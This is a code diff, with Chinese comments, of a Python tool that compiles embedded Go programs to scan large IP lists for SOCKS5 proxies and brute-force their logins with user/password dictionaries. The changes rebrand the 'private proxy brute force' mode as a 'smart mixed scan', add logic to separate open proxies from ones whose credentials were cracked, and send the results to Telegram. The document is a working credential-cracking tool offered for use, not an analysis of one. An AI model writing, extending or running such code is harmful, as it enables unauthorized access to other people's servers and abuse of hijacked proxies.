@@ -24,7 +24,7 @@ except ImportError:
     sys.exit(1)
 
 # ==========================================
-# GO 核心代码区 (已修复 unused variable 错误)
+# GO 核心代码区
 # ==========================================
 
 # 1. 协议验证器 (Protocol Verifier)
@@ -42,19 +42,6 @@ import (
 	"sync/atomic"
 	"time"
 )
-
-// 进度心跳
-func progressReporter(counter *uint64) {
-	for {
-		time.Sleep(1 * time.Second)
-		c := atomic.LoadUint64(counter)
-		if c > 0 {
-			atomic.AddUint64(counter, ^uint64(c-1)) // 重置计数
-			// 发送累积的进度 (这里简化处理，每秒发送一次信号)
-			// 在高并发下，我们只打印一个标记字符让Python端捕获
-		}
-	}
-}
 
 func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, counter *uint64) {
 	defer wg.Done()
@@ -91,15 +78,12 @@ func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, count
 
 func main() {
 	inputFile := flag.String("inputFile", "", "Input File")
-    // [修复] 删除了未使用的 outputFile 变量，防止Go编译报错
 	threads := flag.Int("threads", 500, "Threads")
 	timeout := flag.Int("timeout", 5, "Timeout")
 	flag.Parse()
 
 	file, err := os.Open(*inputFile)
-	if err != nil {
-		return
-	}
+	if err != nil { return }
 	defer file.Close()
 
 	scanner := bufio.NewScanner(file)
@@ -107,19 +91,15 @@ func main() {
 	var wg sync.WaitGroup
 	var count uint64
 
-	// 启动 Worker
 	for i := 0; i < *threads; i++ {
 		wg.Add(1)
 		go worker(jobs, time.Duration(*timeout)*time.Second, &wg, &count)
 	}
 
-	// 发送任务
 	go func() {
 		for scanner.Scan() {
 			t := strings.TrimSpace(scanner.Text())
-			if t != "" {
-				jobs <- t
-			}
+			if t != "" { jobs <- t }
 		}
 		close(jobs)
 	}()
@@ -128,7 +108,7 @@ func main() {
 }
 '''
 
-# 2. 深度连通性验证器 (Deep Verifier)
+# 2. 深度连通性验证器 (Deep Verifier) - [修复] 目标更换为 Microsoft
 GO_SOURCE_CODE_DEEP_VERIFIER = r'''
 package main
 
@@ -159,9 +139,8 @@ func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, count
 			n, _ := conn.Read(resp)
 			
 			if n == 2 && resp[0] == 0x05 && resp[1] == 0x00 {
-				// 2. 尝试连接 Google DNS (8.8.8.8:53) 或 网站
-				// 这里为了通用性，我们尝试连接 www.google.com:80
-				destHost := "www.google.com"
+				// 2. 尝试连接 www.microsoft.com:80 (比 Google 更容易全球访问)
+				destHost := "www.microsoft.com"
 				destPort := 80
 				
 				req := []byte{0x05, 0x01, 0x00, 0x03} // CONNECT, IPv4/Domain
@@ -200,7 +179,6 @@ func worker(jobs <-chan string, timeout time.Duration, wg *sync.WaitGroup, count
 
 func main() {
 	inputFile := flag.String("inputFile", "", "Input")
-    // [修复] 删除了未使用的 outputFile 变量，防止Go编译报错
 	threads := flag.Int("threads", 200, "Threads")
 	timeout := flag.Int("timeout", 10, "Timeout")
 	flag.Parse()
@@ -222,9 +200,7 @@ func main() {
 	go func() {
 		for scanner.Scan() {
 			t := strings.TrimSpace(scanner.Text())
-			if t != "" {
-				jobs <- t
-			}
+			if t != "" { jobs <- t }
 		}
 		close(jobs)
 	}()
@@ -233,7 +209,7 @@ func main() {
 }
 '''
 
-# 3. 认证扫描器 (Auth Scanner)
+# 3. 认证扫描器 (Auth Scanner) - 逻辑保持不变，依靠 Python 进行智能去重
 GO_SOURCE_CODE_SCANNER = r'''
 package main
 
@@ -328,9 +304,7 @@ func main() {
 	var proxies []string
 	for _, l := range pLines {
 		t := strings.TrimSpace(l)
-		if t != "" {
-			proxies = append(proxies, t)
-		}
+		if t != "" { proxies = append(proxies, t) }
 	}
 
 	// 2. 读取字典列表
@@ -357,8 +331,6 @@ func main() {
 			for _, credLine := range dLines {
 				cl := strings.TrimSpace(credLine)
 				if cl == "" { continue }
-				
-				// 尝试解析 user:pass
 				cParts := strings.SplitN(cl, ":", 2)
 				if len(cParts) == 2 {
 					jobs <- Job{Host: parts[0], Port: parts[1], User: cParts[0], Pass: cParts[1]}
@@ -426,14 +398,10 @@ def get_go_path():
     return None
 
 def compile_go_binaries():
-    """
-    编译 Go 二进制文件。
-    [修复] 自动检测 HOME 环境变量，如果缺失（如 Termux）则自动配置，
-    避免 'missing GOCACHE' 或 'HOME not defined' 错误。
-    """
+    """编译 Go 二进制文件，自动处理环境变量缺失问题。"""
     go_exec = get_go_path()
     if not go_exec:
-        print("错误: 未找到 'go' 命令。请先安装 Go 语言环境 (https://go.dev/dl/)。")
+        print("错误: 未找到 'go' 命令。请先安装 Go 语言环境。")
         return False
     
     os.makedirs(CACHE_DIR, exist_ok=True)
@@ -443,21 +411,12 @@ def compile_go_binaries():
         "scanner": GO_SOURCE_CODE_SCANNER
     }
     
-    # --- [修复核心] 配置 Go 编译环境变量 ---
+    # 修复环境变量
     build_env = os.environ.copy()
-    
-    # 确定临时目录
     temp_base = tempfile.gettempdir()
-    
-    # 修复 1: 如果没有 HOME (Termux/Docker)，设置一个
-    if 'HOME' not in build_env:
-        build_env['HOME'] = temp_base
-        
-    # 修复 2: 强制指定 GOCACHE，确保可写
-    # 很多时候即便有 HOME，GOCACHE 默认路径也可能不可写
+    if 'HOME' not in build_env: build_env['HOME'] = temp_base
     build_env['GOCACHE'] = os.path.join(temp_base, 'go_build_cache')
     os.makedirs(build_env['GOCACHE'], exist_ok=True)
-    # ----------------------------------
 
     print("正在检查核心组件...")
     for name, code in sources.items():
@@ -475,16 +434,13 @@ def compile_go_binaries():
             src_path = os.path.join(CACHE_DIR, name + ".go")
             with open(src_path, "w", encoding="utf-8") as f: f.write(code)
             
-            # 调用 Go 编译器，传入自定义环境变量
             result = subprocess.run(
                 [go_exec, "build", "-ldflags", "-s -w", "-o", out_path, src_path], 
-                capture_output=True, text=True,
-                env=build_env # 使用修复后的环境变量
+                capture_output=True, text=True, env=build_env
             )
             
             if result.returncode != 0:
-                print(f"\n[错误] 编译 {name} 失败！")
-                print(f"错误信息:\n{result.stderr}")
+                print(f"\n[错误] 编译 {name} 失败！\n{result.stderr}")
                 return False
                 
             with open(hash_path, 'w') as f: f.write(cur_hash)
@@ -492,7 +448,7 @@ def compile_go_binaries():
         COMPILED_BINARIES[name] = out_path
     return True
 
-# --- 核心运行逻辑 (带进度条与结果处理) ---
+# --- 核心运行逻辑 ---
 def run_go_process(bin_name, args, total_tasks, raw_output_file):
     bin_path = COMPILED_BINARIES.get(bin_name)
     if not bin_path: return
@@ -501,11 +457,10 @@ def run_go_process(bin_name, args, total_tasks, raw_output_file):
     cmd = [bin_path] + args
     
     try:
-        # 打开子进程，实时读取stdout
         process = subprocess.Popen(
             cmd, 
             stdout=subprocess.PIPE, 
-            stderr=subprocess.PIPE, 
+            stderr=subprocess.STDOUT, 
             text=True, 
             encoding='utf-8', 
             errors='replace', 
@@ -513,7 +468,7 @@ def run_go_process(bin_name, args, total_tasks, raw_output_file):
         )
         
         success_count = 0
-        with tqdm(total=total_tasks, unit="chk", dynamic_ncols=True, desc="执行中") as pbar:
+        with tqdm(total=total_tasks, unit="chk", dynamic_ncols=True, desc="执行中", mininterval=0.5) as pbar:
             with open(raw_output_file, 'w', encoding='utf-8') as f_out:
                 while True:
                     line = process.stdout.readline()
@@ -522,68 +477,117 @@ def run_go_process(bin_name, args, total_tasks, raw_output_file):
                     
                     line = line.strip()
                     if line == "P":
-                        # P 代表进度心跳
-                        pbar.update(20 if bin_name == "protocol_verifier" else (10 if bin_name == "deep_verifier" else 50))
+                        step = 20 if bin_name == "protocol_verifier" else (10 if bin_name == "deep_verifier" else 50)
+                        pbar.update(step)
                     elif line.startswith("S|"):
-                        # S 代表成功结果
                         success_count += 1
                         f_out.write(line + "\n")
                         f_out.flush()
-                        
-                        # 在进度条上方打印简略信息
                         parts = line.split("|")
                         if len(parts) >= 2:
                             display = parts[1]
-                            if len(parts) >= 4 and parts[3]: # 有用户名
-                                display += f" ({parts[3]})"
+                            if len(parts) >= 4 and parts[3]: display += f" ({parts[3]})"
                             tqdm.write(f"  [+] 发现: {display}")
-        
-        print(f"\n任务完成。共发现 {success_count} 个有效目标。")
+                    elif line.startswith("panic:") or line.startswith("Error:"):
+                        tqdm.write(f"  [Go内核警告]: {line}")
+
+        print(f"\n任务完成。收到 {success_count} 个响应。")
         
     except Exception as e:
         print(f"\n运行时发生错误: {e}")
+        try: process.kill()
+        except: pass
 
-# --- 结果合成与格式化 ---
+# --- [重点修改] 结果合成与智能去重 ---
 def finalize_results(raw_file, output_dir, file_prefix):
+    """
+    智能处理结果：
+    1. 协议/深度验证：普通格式化。
+    2. 认证扫描：智能去重逻辑。
+       - 如果 IP 标记为 OPEN，则丢弃该 IP 的所有账号密码记录，只作为公共代理输出。
+       - 如果 IP 成功登录超过 3 次（不同密码），视为泛解析/Honeypot，只作为公共代理输出。
+    """
     if not os.path.exists(raw_file): return None
     
     timestamp = datetime.now().strftime("%Y%m%d-%H%M")
     final_filename = f"{file_prefix}_Result_{timestamp}.txt"
     final_path = os.path.join(output_dir, final_filename)
     
-    unique_lines = set()
+    # 临时存储结构: { "ip:port": [ { "user": "u", "pass": "p", "is_open": bool } ] }
+    ip_map = {}
     
+    print("\n正在进行智能分析与去重...")
     with open(raw_file, 'r', encoding='utf-8') as fin:
         for line in fin:
             if not line.startswith("S|"): continue
             parts = line.strip().split("|")
-            # 格式解析
-            formatted = ""
-            if len(parts) == 2: # S|ip:port (协议验证/深度验证)
-                formatted = f"socks5://{parts[1]}"
-            elif len(parts) >= 5: # S|ip|port|user|pass|OPEN or S|ip|port|user|pass
-                if parts[4] == "OPEN": # 标记为 OPEN
-                     formatted = f"socks5://{parts[1]}:{parts[2]}"
+            
+            # 处理基本验证 (protocol/deep)
+            if len(parts) == 2:
+                key = f"{parts[1]}" # IP or IP:Port
+                if key not in ip_map: ip_map[key] = []
+                ip_map[key].append({"is_open": True, "type": "basic"})
+                
+            # 处理认证扫描 (Auth Scan)
+            elif len(parts) >= 5:
+                ip_port = f"{parts[1]}:{parts[2]}"
+                if ip_port not in ip_map: ip_map[ip_port] = []
+                
+                if parts[4] == "OPEN":
+                    ip_map[ip_port].append({"is_open": True, "type": "auth"})
                 else:
-                     formatted = f"socks5://{parts[3]}:{parts[4]}@{parts[1]}:{parts[2]}"
-            
-            if formatted: unique_lines.add(formatted)
-            
+                    ip_map[ip_port].append({
+                        "is_open": False, 
+                        "user": parts[3], 
+                        "pass": parts[4], 
+                        "type": "auth"
+                    })
+
+    final_lines = []
+    
+    for ip_key, entries in ip_map.items():
+        # 1. 检查是否包含 OPEN 状态
+        is_public = False
+        for e in entries:
+            if e.get("is_open"):
+                is_public = True
+                break
+        
+        # 2. 检查是否为泛解析 (同一个IP有超过3个不同的账号密码成功)
+        # 只有当没有明确 OPEN 标记时才检查这个
+        if not is_public and len(entries) >= 3:
+            # 简单检查 entries 中的 user/pass 是否确实不同 (虽然大概率不同)
+            is_public = True
+        
+        if is_public:
+            # 如果是公共代理，只输出一条记录，丢弃所有 user:pass
+            # 格式: socks5://ip:port
+            final_lines.append(f"socks5://{ip_key}")
+        else:
+            # 如果是私密代理，输出所有成功的组合
+            for e in entries:
+                if e.get("type") == "basic":
+                    final_lines.append(f"socks5://{ip_key}")
+                else:
+                    final_lines.append(f"socks5://{e['user']}:{e['pass']}@{ip_key}")
+
+    unique_lines = sorted(list(set(final_lines)))
+
     if unique_lines:
         with open(final_path, 'w', encoding='utf-8') as fout:
-            fout.write("\n".join(sorted(unique_lines)))
-        print(f"\n[OK] 结果已合并并格式化: {final_path}")
-        print(f"     共 {len(unique_lines)} 行数据，格式: socks5://user:pass@host:port")
+            fout.write("\n".join(unique_lines))
+        print(f"[OK] 结果已生成: {final_path}")
+        print(f"     原始响应: {sum(len(v) for v in ip_map.values())} -> 智能去重后: {len(unique_lines)}")
         return final_path
     else:
-        print("\n[-] 未产生有效结果，跳过文件生成。")
+        print("[-] 未产生有效结果。")
         return None
 
 # --- 任务处理函数 ---
 def execute_verifier(config, output_dir, mode):
     modes = {
         "protocol": {"bin": "protocol_verifier", "name": "协议验证", "desc": "快速筛选响应Socks5握手的端口"},
-        "deep": {"bin": "deep_verifier", "name": "连通验证", "desc": "深度验证通过Google的连通性"}
+        "deep": {"bin": "deep_verifier", "name": "连通验证", "desc": "深度验证通过 Microsoft 的连通性"}
     }
     info = modes[mode]
     print_header(info["name"]); print(info["desc"])
@@ -591,7 +595,6 @@ def execute_verifier(config, output_dir, mode):
     f_path = get_validated_input("输入文件 (IP:Port): ", os.path.exists, "文件不存在")
     threads = get_validated_input("并发数 (默认800): ", lambda x: x=="" or x.isdigit(), "") or "800"
     
-    # 计算任务量
     total = sum(1 for l in open(f_path, 'r', errors='ignore') if l.strip())
     if total == 0: return
 
@@ -602,13 +605,17 @@ def execute_verifier(config, output_dir, mode):
     if final: send_telegram(config, final, total)
     if os.path.exists(raw_out): os.remove(raw_out)
 
-def handle_auth_scan(output_dir, config):
-    print_header("私有代理爆破")
+def handle_smart_scan(output_dir, config):
+    print_header("智能混合扫描 (公共 + 私密)")
+    print("说明: 同时测试 无密码 和 密码字典。")
+    print("      自动去重: 如果检测到无需密码，会自动移除该IP的账号密码测试结果。")
+    print("      自动识别: 如果一个IP允许任意密码登录，将自动标记为公共代理。\n")
+
     print("  [1] 组合爆破 (User.txt + Pass.txt)")
     print("  [2] 同名爆破 (User = Pass)")
     print("  [3] 经典模式 (User:Pass 文件)")
     
-    c = input("\n选择模式: ")
+    c = input("\n选择字典模式: ")
     temp_dir = tempfile.mkdtemp()
     dict_path = os.path.join(temp_dir, "dict.txt")
     
@@ -640,9 +647,11 @@ def handle_auth_scan(output_dir, config):
         total_tasks = p_count * d_count
         
         raw_out = os.path.join(temp_dir, "raw_scan.txt")
+        # 直接复用 scanner，它本身就会同时探测 "无需认证" 和 "密码认证"
+        # 核心在于 finalize_results 的智能处理
         run_go_process("scanner", ["-proxyFile", proxy_file, "-dictFile", dict_path, "-threads", threads, "-timeout", timeout], total_tasks, raw_out)
         
-        final = finalize_results(raw_out, output_dir, "Auth_Crack")
+        final = finalize_results(raw_out, output_dir, "Smart_Scan")
         if final: send_telegram(config, final, p_count)
         
     finally:
@@ -675,15 +684,15 @@ def main():
     while True:
         print("\n--- 主菜单 ---")
         print("  [1] 验证 Socks5 协议 (快速)")
-        print("  [2] 发现可用 Socks5 (深度连通性)")
-        print("  [3] 私有代理爆破 (Auth Crack)")
+        print("  [2] 发现可用 Socks5 (深度验证 - Microsoft)")
+        print("  [3] 智能混合扫描 (推荐 - 自动去重公共代理)")
         print("  [4] 设置")
         print("  [q] 退出")
         
         c = input("\n请选择: ").lower()
         if c == '1': execute_verifier(config, out_dir, "protocol")
         elif c == '2': execute_verifier(config, out_dir, "deep")
-        elif c == '3': handle_auth_scan(out_dir, config)
+        elif c == '3': handle_smart_scan(out_dir, config)
         elif c == '4': handle_config_menu(config)
         elif c == 'q': break
         else: print("无效输入")
